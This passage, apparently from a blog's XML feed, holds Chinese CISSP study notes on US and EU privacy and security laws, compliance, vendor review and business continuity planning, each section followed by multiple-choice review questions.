Act，ECPA)使得对个人电子隐私的侵犯成为犯罪行为。这个法案更新了联邦窃听法案，以便应用于非法的电子(也就是计算机)通信侦昕或者对于以电子形式存储的数据的有意和未授权访问。ECPA禁止侦昕或泄漏电子通信，并且定义了公开电子通信的合法情况。该法案对电子邮件和语音邮件通信的监视提供了防护，并且防止这些服务的提供商对这些内容进行未授权的公开。 执法通信协助法案(1994年) 执法通信协助法案(Communication Assistance for Law Enforcement Act，CALEA)是对1986年的电子通信隐私法案的修正。CALEA要求：无论采用怎样的技术，所有通信运营商都需要允许持有适当法院判决的执法人员进行窃听。 经济和专有信息保护法案(1996年) 经济和专有信息保护法案将财产的定义扩展为包括经济信息，从而可以将窃取这类信息的行为视作针对行业或公司的间谍行为。这个法案修改了盗窃的法律定义，从而使这种行为不再受到物理约束。 健康保险流通与责任法案(1996 年) 1996年，美国国会通过了健康保险流通与责任法案(Health Insurance Portability and Accountability Act，HIPAA) ，这使得管理健康保险和健康保护组织(Health Maintenance Organization，HMO)的法律发生了许多变化。在回PAA 的条款中，隐私和安全法规要求医院、医师、保险公司和其他处理或存储个人医疗隐私信息的组织采取严格的安全措施。HIPAA 还明确地定义了个人在医疗记录方面的权利，并且要求保存医疗记录的组织书面表明这些权利。 2009关于经济和临床健康的卫生信息技术法案 在2009年，美国国会通过了”关于经济和临床健康的卫生信息技术法案(Health Infomation Technology for Economic and Clinical Health，HITECH)”来修订HIPAA。这条法律更新了许多HIPAA的隐私和安全需求，并于2013 年通过HIPAA Omnibus Rule实施。被新法规强制变化的其中之一就是在法律对待商业伙伴(Business Associate，BA)的方式上，处理被保护的健康信息(protected Health Information，PHI)的组织机构代表了HIPAA覆盖的实体。覆盖实体和一个BA 之间的任何关系必须被书面合同管理，这个合同被称为业务联合协议。HITECH也引入了新的数据泄露通告需求。在HITECH违约通知规则下，经历了数据泄露的HIPAA覆盖实体必须通知受影响的个人，当泄露影响超过500人时，必须通知卫生和人力服务部的部长和媒体。 儿童联机隐私保护法案(1998年) 2000年4月，儿童联机隐私保护法案(CHildren’s Online Privacy Protection Act，COPPA)中的规定成为美国本土的法律。COPPA对关心孩子或有意收集孩子的信息的网站提出了一系列要求： 网站必须发送隐私通知，清楚地说明他们所收集信息的类型和用途，包括是否有一些信息会泄漏给第三方。隐私通知还必须包括网站工作者的联系信息。 必须向父母提供机会，复查任何从他们的孩子那里收集到的信息，并且可以从网站的记录中永久地删除这些信息。 如果孩子的年龄小于13岁，那么在收集信息前，父母必须对有关孩子信息的收集做出可证实的允许。法律中存在一些例外，准许Web站点只是为了获得父母允许收集最少的信息。 Gramm-Leach-Bliley法案(1999年) 直到Gramm-Leach-Bliley Act(GLBA)法案于1999年成为法律，在商业机构之间才形成了严格的政府屏障。银行、保险公司和贷款提供商受到对他们所能提供的服务和相互共享的信息的严格限制。GLBA 稍微放松了涉及每个组织所能提供的服务的规定。当美国国会通过了这条法案后，它意识到这扩大了具有深远隐私意义的范围。基于这点考虑，该法案包括了许多限制，对可能在相同公司的子公司之间交换的信息类型进行了限制，并且要求从2001年7月1日开始金融机构对所有用户提供书面的隐私策略。 美国爱国者法案(2001年) 美国国会对2001年9月11日发生在纽约市和华盛顿哥伦比亚特区的9.11恐怖袭击做出了直接反应：通过了提供拦截和阻止恐怖行为所需的适当工具来团结和巩固美国(USA PATRIOT)法案。美国爱国者法案大大扩大了执法机构和情报机构跨多个领域的力量，包括对电子通信的监视。美国爱国者法案提出的一个主要改变涉及政府机构获取窃听授权的方法。以前，策略只能一次获取一条线路的授权(在证实这条线路被受到监控的某人使用后)。美国爱国者法案规定准许官方获得对个人的一揽子授权，并且随后根据这项单一授权监视此人的所有通信。另一个主要的改变是政府处理网络服务提供商(ISP)的方式。根据美国爱国者法案中的条款，ISP可以自愿地向政府提供大范围的信息。美国爱国者法案还准许政府通过使用传唤获取用户活动的详细信息(与窃听相反)。最后，美国爱国者法案修正了计算机欺诈和滥用法案(是另一组修正案)，从而对犯罪行为处以更严厉的处罚。美国爱国者法案规定了最长20年的监禁条款，并再一次扩大了CFAA的范围。 子女教育权利和隐私法案 子女教育权利和隐私法案(Family Educational Rights and Privacy Act，FERPA)是另一种特殊的隐私法案，它影响所有接受美国联邦政府资助的教育机构(绝大多数学校)。这个法案赋予18岁以上的学生和未成年学生父母的确定的隐私权。具体的FERPA 保护包括下列内容： 父母/学生具有检查由教育机构保存的此学生教育记录的权利。 父母/学生具有要求改正他们认为不正确的记录的权利，具有在记录中包括声明争辩任何没有被改正的内容的权利。 学校不能不经书面许可而发放学生记录的个人信息，某些特定的情况除外。 身份偷窃和冒用阻止法案(1998年) 1998年，美国总统签署了身份偷窃和冒用阻止法案，从而使之成为法律。在过去，只有身份偷窃的合法受害人才是受侵害的债权人。这个法案使得身份偷窃成为对被偷窃身份的个人犯罪行为，并且规定了对任何违反此法律的人处以严厉的犯罪处罚(长达15年的监禁条款和250000美元的罚款)。 2.欧盟隐私法 1995年10月24日，欧盟(European Union，EU)议会通过了描绘隐私措施的概括指令，也就是必须采取措施保护信息系统中处理的个人数据。这个指令在3年后(1998年10月)生效。指令要求所有个人数据的处理都要满足下列标准中的某一条： 同意 合同 法律义务 数据主体的主要利益 数据所有者和数据主体之间利益的平衡 如下所示，指令还描述了有关数据被持有和处理的个人的重要权利： 访问数据的权利 知道数据源的权利 改正错误数据的权利 拒绝在某些情况下处理数据的权利 这些权利被违反时应当采取的合法行为 甚至欧洲以外的组织，根据跨境数据流的要求，必须考虑这些规则的适用性。为防止欧盟公民的个人信息从欧盟泄露出去，这些发送的数据必须确保是受到保护的。在欧洲从事商业活动的美国公司可以根据欧盟和美国之间的谈判获得保护，该谈判准许美国商务部证明业务遵守规定，并且为他们提供”安全避难所”，以免于受到起诉。为了符合安全避难所规定，在欧洲进行商业活动的美国公司必须满足下列7 项处理个人信息的要求： 通知 他们必须通知个人收集了什么信息，以及信息将如何使用。 选择 如果信息将被用于其他目的或与第三方共享，那么他们必须准许个人决定退出。对于涉及敏感的信息，必须采取决定参加的策略。 向前传递 企业只可能与其他遵守安全避难所原则的企业共享数据。 访问 个人必须被授权访问任何包含其个人信息的数据。 安全 必须采取适当的机制保护数据，以防止丢失、监用和未授权的公开。 数据完整性 企业必须采取措施，确保他们所维护信息的可靠性。 实施 企业必须为个人提供争论解决办法，向管理机构提供证明，表明遵守安全避难所规定。 4.3 合规性 在过去的10年间，信息安全管理的监管环境变得越来越复杂。组织可能会发现自己受到广泛的各种各样的法律约束，以及来自监管机构或合同义务的强制合规。组织在面对和处理许多的交叉和有时相互矛盾的合规需求时，需要仔细计划。许多组织雇佣全职的盯合规人员负责跟踪合规环境，监督控制以确保持续合规，促进合规性审核，并满足该组织的合规性报告责任。 组织可能会经受合规性审计，要么通过标准内部或外部审计机构，要么通过监管或其代理。例如，组织的财务审计人员也许主导IT 控制审计，这种审计被设计用于确保组织金融系统的信息安全控制满足萨班斯·奥克斯利法案的要求。除了正式的审计，组织必须经常把合规遵从报告发送给内部或外部的股东。例如，组织的董事会(或者，更多是董事会的审计委员会)可能需要定期的合规义务和状况的报告。 4.4 合同与采购 使用云服务和其他外部供应商来存储、处理和传输敏感信息的用户逐渐增加，这导致一些组织在他们的合同签订和采购过程中，实施安全审查和控制成为一个新的关注点。安全专家应该主导对供应商部署的安全控制措施进行审查，这包括最初的供应商选择和评估流程，以及作为供应商持续管理过程的一部分。供应商管理审查中覆盖的一些问题包括： 什么类型的敏感信息应该由供应商存储、处理或发送? 在部署保护组织信息时有什么样的控制措施? 组织的信息如何与其他客户的信息分开? 如果加密是一种值得信赖的安全控制措施，那么我们要用什么样的加密算法和密钥长度?密钥管理如何进行? 供应商执行了什么类型的安全审计? 客户访问这些审计必须做什么? 供应商是否依赖于任何其他第三方来存储、处理或传输数据? 如何处理扩展到第三方与安全有关的合同条款? 数据存储、处理和传输发生在什么地方? 如果客户或供应商在国外，会有什么影响? 供应商的事件响应流程是什么? 什么时候将会通知客户存在潜在安全泄露? 在确保客户数据的持续完整性和可用性方面有什么条款? 4.5 考试要点 了解刑法、民法和行政法之间的差别 刑法保护社会免遭那些违反我们信奉的基本原则的行为。违反刑法的行为是由美国联邦和州政府进行起诉的。民法提供了个人和组织之间的商业交易体制。违反民法的行为被提交法院并由受到影响的双方进行辩论。行政法是由政府机构使用的，目的是为了有效地执行日常事务。 能够解释用来保护社会免遭计算机犯罪影响的主要法律的基本条款 计算机诈骗和滥用法案(修正案)保护政府或州间贸易使用的计算机不被滥用。计算机安全法案概括了政府为了保护自己的系统免遭攻击而必须采取的措施。政府信息安全改革法案进一步发展了美国联邦政府信息安全程序。 了解版权、商标、专利权和商业秘密之间的差别 版权保护创作者的原创作品，如书籍、文章、诗和歌曲。商标是名称、口号和徽标，用于杭只公司、产品或服务。专利权为新发明的创作者提供保护。商业秘密法律保护公司的运营机密。 能够解释数字干禧年版权法案(1998年)的基本条款 数字千禧年版权法案禁止绕过针对数字介质的复制保护机制，并限制网络服务提供商对于其用户行为的责任。 了解经济间谍法案(1996年)的基本规定 经济间谍法案对任何被发现偷盗商业秘密的人进行处罚。在盗窃者知道这些信息将为外国政府获利时，他会被处以严厉的处罚。 理解不同类型的软件许可证协议 合同许可证协议是软件商和用户之间采用的书面协议。收缩性薄膜包装协议写在软件包装上，并且在用户打开包装时生效。单击包装协议包括在包装中，但是需要用户在软件安装过程中接受这些条款。 解释关于软件许可证颁发的统一计算机信息剑主里法案 统一计算机信息处理法案提供了由美国联邦和州政府强制执行的收缩性薄膜包装和单击包装协议的架构。 理解一个经历数据破坏的组织的通告要求 加利福尼亚外版布的SB 1386是第一个在全州范围内要求通告个人信息被泄漏到当事人的法律。美国目前除了三个州以外的其他外州都最终审议通过了相似的法律。目前，只有当涉及HIPPA覆盖的实体破坏了它们保护的健康信息时，联邦法律才要求需要通知个人。 理解在美国和欧盟管理个人信息隐私的主要法律 美国有很多影响政府对信息的使用以及控制涉及敏感信息的具体行业(如金融服务公司和卫生健康组织)对信息使用的隐私法律。欧盟对数据隐私有着更加广泛的法令，以管理个人信息的使用和交换。 了解法庭上可接纳的证据的基本要求 要被接纳，证据就必须与本案发生的事实相关，事实必须对本案是必要的，并且证据必须有法定资格或是合法收集的。 了解怎么把安全整合到采购和供应商管理流程中 被许多组织大量使用的云服务，就要求更加注意在供应商选择过程中，以及作为供应商持续管理的一部分，引导信息安全控制的审查。 4.6 复习题 对于病毒、密码和其他类型的破坏计算机系统的恶意代码的编写者，下列哪个刑法是第一个去执行惩罚的?A. 计算机安全法案B. 国家基础设施保护法案C. 计算机欺诈和滥用法案D. 电子传输隐私法案 哪条法律首先要求美国联邦的相关计算机系统操作者接受计算机安全问题的定期培训?A. 计算机安全法案B. 国家基础设施保护法案C. 计算机欺诈和滥用法案D. 电子通信隐私法案 什么类型的法律并不要求国会的法案在联邦一级执行，而是由行政部门以法规、政策和程序的形式颁布?A. 刑法B. 普通法C. 民法D. 行政法 哪个联邦政府机构有安全责任确保政府计算机系统没有用于处理敏感和分类信息?A. 美国国家安全局B. 联邦调查局C. 国家标准和技术协会D. 联邦情报局 什么是计算机系统最广泛的类别，这个类别受计算机欺诈和滥用方案(修正案)保护?A. 政府所属系统B. 联邦相关系统C. 用于洲际贸易的系统D. 美国境内系统 在设置对获得政府部门授权的监管部门搜查私人住宅和设施的权利限制方面，什么法律保护了公民的隐私权?A. 隐私法案B. 第四修正案C. 第二修正案D. Grarnm-Leach-Bliley法案 Matthew最近编写了一个创新的算法去解决一个数学问题，并且他希望与全世界分享。但是，在技术杂志上发布软件代码之前，他想获得一些知识产权方面的保护。下列哪个保护最适合他?A. 版权B. 商标C. 专利D. 商业秘密 Mary 是一家制造企业Acme Widgets的联合创始人。与合伙人Joe一起，她开发了一个特种油，能显著提高小部件的生产过程。为了保证配方的机密性，Mary和Joe计划在其他工人离开后，由他们自己在厂房里大量生产这种油。他们想尽可能保护这个配方。下列哪个知识产权保护最适合他们?A. 版权B. 商标C. 专利D. 商业秘密 Richard近期为计划即将开始使用的新产品起了一个不错的名字。他与律师商量并填写相应的申请去保护他的产品名字，但是仍未从政府收到关于他的申请的回应。他想立即开始使用名字。他应该使用什么样的符号来表明他的产品名字处于受保护的状态?A. ©B. ®C. ™D. t 什么法律禁止政府机构泄露个人提交给政府保护环境下的信息?A. 隐私法案B. 电子通信隐私法案C. 健康保险流通与责任法案D. Gramm-Leach-Bliley法案 软件行业使用什么法律来正式地派发大量许可，并试着标准化从一个州到另一个州的使用?A. 计算机安全法案B. 统一计算机信息处理法案C. 数字千禧年版权法案D. Gramm-Leach-B1i1ey法案 儿童联机隐私保护法案被设计用来保护在互联网上使用的儿童隐私。在企业可以从他们那里收集未经父母同意的个人身份信息之前，孩子的最小年龄是几岁?A. 13B. 14C. 15D. 16 为了获得数字千禧年版权法案的短暂活动条款的保护，下列哪些是互联网服务提供商不用满足的需求?A. 服务提供商和消息的发起者必须处于不同的状态。B. 传输、路由、连接的提供或复制必须由一个没有通过服务提供商选择的材料的自动化技术过程来进行。C. 任何中间副本一般不得让预期外的任何收件人访问，并且不得保留超过合理必要的时间。D. 传输必须由除供应商以外的人发起。 以下哪一个法律不是为了保护消费者和网民的隐私权?A. 健康保险易流通与责任法案B. 阻止盗用和伪装身份法案C. 美国爱国者法案D. Gramm-Leach-B1iley法案 以下哪一项许可协议类型不需要用户在执行之前确认他们己经阅读了协议?A. 标准许可协议B. 拆封协议C. 单击许可协议D. 口头协议 什么行业受Gramm-Leach-Bliley方案中的条款影响最直接?A. 卫生保健B. 银行C. 执法D. 防护承包商 在美国专利保护期是多长?A. 提交申请日开始14年B. 专利获得日开始14年C. 提交申请日开始20年D. 专利获得日开始20年 在处理关于欧盟数据隐私法令下的个人信息时，以下哪一项不是有效的法律依据?A. 合同B. 法律义务C. 市场需求D. 赞成 涉及信用卡信息处理时，要符合什么合规义务?A. SOXB. HIPAAC. PCI DSSD. FERPA 什么法案更新了健康保险流通与责任法案(HIPAA)中的隐私和安全需求?A. HITECHB. CALEAC. CFAAD. CCCA]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（3）——业务连续性计划]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%E2%80%94%E2%80%94%E4%B8%9A%E5%8A%A1%E8%BF%9E%E7%BB%AD%E6%80%A7%E8%AE%A1%E5%88%92%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：安全和风险管理(例如，安全、风险、合规性、法律、法规、业务连续性) G. 理解业务连续性需求 G.l 开发和文档化项目范围和计划 G.2 引导业务影响分析 安全运营(例如基本概念、调查、事件管理、灾难恢复) N. 参与业务连续性规划和演习 3.1 业务连续性计划 业务连续性计划(Business Continuity Planning，BCP)涉及对组织各种过程的风险评估，还有在发生风险的情况下为了使风险对组织的影响降至最小程度而制定的各种策略、计划和措施。 BCP 过程包括以下4 个主要步骤： (1) 项目范围和计划编制 (2) 业务影响评估 (3) 连续性计划 (4) 批准和实现 3.2 项目范围与计划 开发强大的业务连续性计划需要使用经过认证的一套方法。该方法的具体内容如下： 业务组织从危机计划编制的角度进行结构化分析。 在高层管理人员准许的情况下，建立BCP团队。 评估参与业务连续性活动的可用资源。 管理组织对灾难性事件做出反应的法律和法规方面的分析。 3.2.1 业务组织分析 业务组织分析确定参与业务连续性计划编制过程的所有相关部门和人员。分析时需要考虑包括下面的一些领域： 负责为用户提供核心服务业务的运营部门。 重要的支持服务部门，如IT部门、设备维护部门和其他负责对支持运营部门的系统进行检修的团队。 高层行政管理人员和对于组织继续生存来说非常重要的关键个人。 3.2.2 BCP 团队的选择 来自组织的负责业务所提供核心服务的每个部门代表。 经过组织结构分析所确认的重要支持部门代表。 BCP 所涉及领域内的具有技术专长的IT代表。 了解BCP过程的安全代表。 熟悉公司法律、法规和契约责任的法律代表。 来自高层管理部门的代表。 3.2.3 资源需求 BCP开发 BCP团队需要某些资源来实施BCP过程的4个要素(项目范围和计划编制、业务影响评估、连续性计划、批准和实现)。此BCP阶段消耗的资源很可能是BCP团队成员和要求帮助计划开发的支持员工所付出的人力。 BCP测试、培训和维护 BCP的测试、培训和维护阶段会要求一些硬件和软件支持，但是不管怎样，这个阶段的主要支持工作都将涉及活动中部分员工所付出的人力。 BCP实现 当灾难来袭且BCP团队认为有必要全面实E处业务连续性计划时，就需要大量的资源。这包含大量的人力(即使不是全部，BCP也仍然很可能成为组织的主力)和对”硬”资源的利用。出于这个原因，团队正确并果断地使用其BCP实现能力是很重要的。 3.2.4 法律和法规要求 许多行业可能会发现他们要受到联邦政府、州和地方法律或法规的限制，这些限制要求他们实现不同程度的BCP。在BCP过程中，将组织的法律顾问添加进来是非常重要的。法律顾问非常熟悉应用于组织的各种法律、法规和契约责任，在保证组织持续生存从而给包括员工、股东、供应商和用户在内的各方带来利益的同时，他们能够帮助团队实现满足这些要求的计划。 3.3 业务影响评估 业务影响评估(Business Impact Assessment，BIA)确定了能够决定组织持续发展的资源，以及对这些资源的威胁，并且还评估每种威胁实际出现的可能性以及出现的威胁对业务的影响。决策类型如下： 定量决策 定量决策涉及使用数字和公式做出决定。这种数据类型通常以美元表示各种与业务相关的选项。 定性决策 定性决策考虑的是非数值因素，例如情感、投资者/顾客的信心、员工的稳定性以及其他感兴趣的事务。这种数据类型通常以优先级类别(例如，高、中、低)表示。 3.3.1 确定优先级 将确定优先级过程的工作量划分给团队成员的一个主要方法是： 指定每个参与者都创建一个优先级列表，这个列表涉及该参与者所负责部门的业务功能。当整个BCP 团队开会讨论时，团队成员会使用这些优先级列表为整个组织创建一个优先级主列表。 3.3.2 风险识别 风险具有两种形式：自然风险与人为风险。在这个阶段，BCP团队应当不关心每种风险实际发生的可能性，也不必关心发生风险对业务继续运作的影响破坏程度。 3.3.3 可能性评估 可能性评估是为了确定每种风险发生的可能性。 3.3.4 影响评估 从定量的观点出发，业务影响涉及三个特定的度量： 暴露因子、单一损失期望和年度损失期望。 暴露因子(EF)是指风险对资产造成损失的程度，以资产价值的百分比来表示。 单一损失期望(SLE)是指每次风险发生后预计造成的货币损失。 年度损失期望他E)是指一年内由于风险引起资产损失而预计对公司造成的货币损失。 3.3.5 资源优先级划分 BIA的最后一个步骤是划分针对各种不同风险所分配的业务连续性资源的优先级，这些风险己在BIA前面的任务中进行了确定和评估。定性分析可以证明提高或降低风险的优先级是否正确，这些风险在定量列表中存在并己按照ALE进行分类。 3.4 连续性计划3.4.4 策略开发 连续性计划的策略开发阶段为业务影响评估和BCP开发的连续性计划阶段之间架起了桥梁。BCP团队应当回顾一下BIA前期建立的MTD评估时间，并且确定哪些风险被认为是可接受的，哪些必须采取BCP连续性措施加以缓解。 3.4.2 预备和处理 人必须确保组织内部的人在紧急事件发生前、发生期间和发生后都是安全的。 建筑物/设备 强化预备措施 BCP应当对要采取的机制和过程进行概述，这些机制和过程可以被用于保护现有的设施能够抵御策略开发阶段定义的风险。这可能会包括一些步骤，这些步骤既可能像修补漏屋顶一样简单，也可能像安装用风遮蔽物和防火墙一样复杂。 预备场所 在不可能强化设施抵御风险时，BCP应该确定业务活动可以立即恢复的预备场所(或为所有受影响的关键性业务功能提供的时间至少要低于最大可容忍故障时间)。 基础设施 强化系统 可以通过引入保护性措施来为系统抵御风险，这些措施包括计算机防火抑制系统和不间断电源。 预备系统 业务功能也可以通过引入的冗余性得到保护(依赖于不同设备的元余构件，或是完全冗余的系统或通信链接)。 3.4.3 计划批准和实现 资深管理人员的批准和参与是整个BCP 工作成功的关键。如果可能，那么应当尝试获得公司最高领导(如首席执行官、董事长、总裁或类似的业务领导)对计划的批准。这个步骤证明了计划对整个组织的重要性，并且显示了业务领导对业务连续性的承诺。像这样的个人签名还加深了对其他资深经理的影响和计划的可信性，否则他们将会把计划作为必要的但却琐碎的IT 事务丢在一边。 3.4.4 计划实现 BCP团队应该共同开发一个实现计划，这个计划利用特定的资源，从而尽可能迅速地在给出修改范围和组织环境的情况下取得所声明的过程和预备措施的目标。在完全部署所有这些资源之后，BCP团队应当监督恰当的BCP 维护程序，以便确保计划能够响应业务需求的发展。 3.4.5 培训和教育 组织中的每个人都应当接受至少一份计划综述简报，从而使他们具有信心，相信业务领导己经考虑到连续性业务的可能风险，并且制定了计划来缓解对组织的影响。具有直接的BCP职责的人们应当受到培训，对其具体的BCP任务进行评估，确保在灾难发生时他们能够有效地完成其任务。此外，至少应当为每个BCP任务培训一名候补人员，以便确保在人员受伤或危机时刻人员不能到位时的冗余性。 3.5 BCP 文档化将BCP方法文档化具有以下优点： 确保所有BCP 人员都有一个连续性的书面文档，在紧急事件发生时，甚至在资深BCP 团队成员不在现场指导时可以作为参考。 提供了BCP 过程的历史记录，这对于将来人员试图理解不同过程的内因并对计划进行必要的修改是有用的。 促使团队成员将他们的想法记录到纸上，这个过程常常有助于确定计划中的缺陷。将计划记录到纸上还可以向不属于BCP 团队的人分发简报，从而进行” 理智的分析” 。 3.5.1 连续性计划的目标 BCP的最常见目标十分简单： 确保在紧急事件发生时业务的连续性操作。为了满足组织的需求，其他目标也可能被放入文档的这部分内容。 3.5.2 重要性声明 重要性声明反映了BCP对于组织继续生存能力的关键程度。这份文档通常采取向组织的员工发送信件的形式，声明为什么要将重要的资源放到BCP开发过程中，并且要求所有人员在BCP实现阶段进行协作。这就是高管参与BCP的重要性。如果可以在这封信上签署CEO或类似级别领导的名字，那么这个计划本身将在整个组织内实现改变时产生极大的影响。 3.5.3 优先级声明 优先级声明是业务影响评估的优先级确定阶段的直接产物，它仅仅涉及按优先次序列出的被认为对连续业务操作具有关键作用的功能。当列出这些优先级后，你还应当包括一个声明，指出它们作为BCP过程的一部分进行开发，并且反映在紧急事件中这些功能对连续性业务操作的重要性。 3.5.4 组织职责的声明 组织职责的声明也来自于高管，并且可能并入与重要性声明相同的文档内。它基本上反映了”业务连续性是所有人的职责”这一观点。组织职责的声明重申了组织对业务连续性计划的承诺，并且通知组织的员工、供应商和分支机构，要求他们每个人都做他们能够协助BCP过程的所有工作。 3.5.5 紧急程度和时限的声明 紧急程度和时限的声明表述了实现BCP的关键性，并且概述了由BCP 团队决定的并由上层管理者同意的实现时间表。声明的措辞将依赖于由组织的领导层为BCP过程分配的实际的紧急程度。 3.5.6 风险评估 对于定量分析来说，应当包括实际的AV、EF、ARO、SLE和ALE数值。对于定性分析来说，风险分析背后的考虑过程应当提供给阅读者。值得注意的是，风险评估内容必须进行定期更新，因为它反映了某个时间点的评估。 3.5.7 可接受的风险/风险缓解 BCP文档中可接受的风险/风险缓解部分包含BCP过程的策略开发部分的结果。它应该覆盖风险分析部分确定的所有风险，并且概述一个或两个考虑过程(如下所示)： 对于那些被认为可接受的风险，应当概述风险被认为可接受的原因，以及未来可能导致值得重新考虑这个决定的事件。 对于那些被认为不可接受的风险，应当概述风险缓解的预备措施和用来减少威胁组织持续生存能力的风险过程。 3.5.8 重大记录计划 这份文档阐述了关键业务记录将要存放的地方和对这些记录建立和存储副本的过程。 执行重大记录计划最大的挑战之一，通常首要的是识别重大记录。在许多组织从纸质转换为数字工作流时，他们常常丢失了围绕创建和维护正式文件结构的精确性。重大记录可能现在分布在各种IT系统和云服务中。一些可能会存储在团队可访问的中央服务器上，然而其他可能位于数字仓库中，并分配给一个员工。 3.5.9 晌应紧急事件的指导原则 紧急事件响应指导原则概述了组织和个人对于紧急事件立即响应的职责。此文档为首先发现紧急事件的员工提供了激活未自动激活的BCP预备措施的步骤，这些指导原则应当包括下列内容： 立即响应规程(安全性规程、防火规程、通知恰当的紧急事件代理机构等) 事件通知清单(主管、BCP团队成员等) 在等待BCP团队集中时采取的二级响应规程 3.5.10 维护 每个组织都会遇到几乎持续的变化，这种动态特性也确保了业务连续性要求随之发生变化。BCP团队不应该在计划开发完成后被解散，而是应当定期接触并讨论计划、复审计划测试的结果，以确保能够继续满足组织的要求。 在更新BCP的任何时候，必须进行良好的版本控制。所有旧的BCP版本都应该进行物理销毁，并且被最新版本代替，这样就不会产生对BCP正确实现的混淆。将BCP 组件包含在工作描述中以便确保BCP保持更新和正确实施是很好的习惯。员工的工作描述中包含BCP职责也会使其成为绩效审查过程考虑的对象。 3.5.11 测试和演习 BCP文档还应当概述一个正式的测试计划，以确保计划是最新的，并且所有人员都接受了充分培训，从而在实际的灾难事件发生时能够履行他们的职责。测试过程实际上与用于灾难恢复的计划非常类似。 3.6 考试要点 理解业务连续性计划编制过程的4个步骤 业务连续性计划涉及4个不同的阶段： 项目范围和计划编制、业务影响评估、连续性计划、批准和实现。每个任务都为整体目标服务，从而确保业务在发生紧急事件时不会中断井持续运营。 描述如何执行业务结构分析 在业务结构分析中，负责领导BCP过程的人确定哪些部门和个人会参与业务连续性计划。这种分析被用作BCP团队选择的基础，并且在BCP团队确认后被用于指导BCP开发的后续阶段。 列出业务连续性计划团队的必要成员 BCP团队至少应当包括下列人员： 每个运营和支持部门的代表 IT部门的技术专家 具有BCP技能的安全人员 熟悉公司法律、规章、契约责任的法律代表以及高管代表 其他团队成员取决于组织的结构和特性。 了解业务连续性计划编制者面对的法律和规章要求 业务领导必须尽职，以确保股东的利益在灾难事件发生时得到保护。美国的一些行业还必须服从美国联邦、州|和当地的法规，这些法规要求特殊的BCP规程。很多业务在灾难发生之前和之后都具有客户必须满足的合约义务。 解释业务影响评估过程的步骤 业务影响评估过程的5 个步骤包括优先级确定、风险确定、可能性评估、影响评估和资源优先级划分。 描述连续性策略的开发过程 在策略开发阶段，BCP团队确定哪些风险要进行缓解。在预备和处理阶段，将会对实际缓解风险的机制和规程进行设计。计划必须随后得到高管的批准并且加以实现。人员还必须接受其在BCP 过程中所处角色的培训。 解释为组织机构的业务连续性计划进行全部文档化的重要性 将计划记录下来，以便在灾难发生时为计划的实施提供规程上的书面记录。这避免了”在我脑子里”的综合症，从而确保在紧急事件中有序地实施计划。 3.7 复习题 对于那些对业务连续性计划开发负责的人来说，第一步应该执行什么?A. 团队选择B. 业务组织分析C. 资源需求分析D. 法律和合规性评估 一旦BCP 团队选定，放在团队议程首要位置的是什么?A. 业务影响评估B. 业务组织评估C. 资源需求评估D. 法律和合规性评估 在组织持续生存方面，为确保适当的措施用于减少灾难影响，以下哪一项描述了企业管理人员和总监的责任?A 企业责任B. 灾难需求C. 应尽关注D. 持续经营责任 在BCP阶段，BCP过程消耗的主要资源将是什么?A. 硬件B. 软件C. 处理时间D. 人员 在业务影响评估的优先级识别阶段，什么测量单位用于资产价值量化?A. 货币B. 效用C. 重要性D. 时间 下列哪一项目A条款标识了一个特定风险每年预计损失的货币量?A. AROB. SLEC. ALED. EF 什么BIA度量值被用于表示一个业务功能的最长中断时间，但这个中断没有对组织产生不可弥补的损害?A. SLEB. EFC. MTDD. ARO 你担心雪崩这个风险会威胁到你的300万美金运输设施。基于业内意见，你确定每年雪崩有5%的几率发生。专家提醒你，雪崩会彻底摧毁你的建筑物，井迫使你在同一块土地上重建。这300万美金的设施中90%的价值是大楼，另外10%是土地本身。雪崩对于你的运输设施的单一损失期望是多少?A. 300 万美金B. 270 万美金C. 27 万美金D. 13.5 万美金 在问题8提到的场景中，年度损失预期是多少?A. 300 万美金B. 270 万美金C. 27 万美金D. 13.5 万美金 你担心咫风会对设在南佛罗里达州的公司总部造成风险。这个建筑物本身价值1500万美金。在咨询了国家气象服务部门后，你确定咫风在一年之中袭击的可能性有10%。你雇佣了一支由建筑师和工程师组成的团队，确定了一般的咫风会摧毁约50%的建筑物。年度损失期望(ALE)是多少?A. 75 万美金B. 150 万美金C. 750 万美金D. 1500 万美金 以下哪个BCP任务连接业务影响评估和连续性规划阶段?A. 资源优先级B. 可能性评估C. 策略开发D. 条款和流程 当设计连续性计划条款和流程时，首先应该保护哪个资源?A. 厂房B. 基础设施C. 金融D. 人 在业务影响评估过程中，下列哪个观点不适合定量测量?A 厂房的损失B. 车辆的损坏C. 负面宣传D. 断电 Lighter Than Air 公司预计如果龙卷风袭击了它的飞机业务设施，就会损失1000万美金。假设龙卷风袭击设施每100年会发生一次。那么在这个场景下单一损失期望是多少?A. 0.01B. 1000 万美金C. 10 万美金D. 0.10 根据问题14提到的场景，年度损失期望是多少?A. 0.01B. 1000 万美金C. 10 万美金D. 0.10 在哪个业务连续性计划任务中，会设计流程和机制以减少BCP团队认定的不可接受的风险?A. 策略阶段B. 业务影响评估C. 条款和流程D. 资源优先级 安装元余通信链路，这是利用了什么类型的缓解条款?A. 加固系统B. 定义系统C. 减轻系统D. 更换系统 如果灾难中断了业务的正常运行，什么类型的计划概述了相关处理流程?A. 业务连续性计划B. 业务影响评估C. 灾难恢复计划D. 脆弱性评估 用于为单个风险场景计算单一损失期望的公式是什么?A. SLE = AV x EFB. SLE = RO x EFC. SLE = AV x AROD. SLE = EF x ARO 对于下面列出的人员，一份重要的业务连续性计划声明会对谁提供最佳承诺?A. 业务运营副总裁B. 首席信息官C. 首席执行官D. 业务连续性经理]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（2）——人员安全和风险管理概念]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%E2%80%94%E2%80%94%E4%BA%BA%E5%91%98%E5%AE%89%E5%85%A8%E5%92%8C%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%E6%A6%82%E5%BF%B5%2F</url>
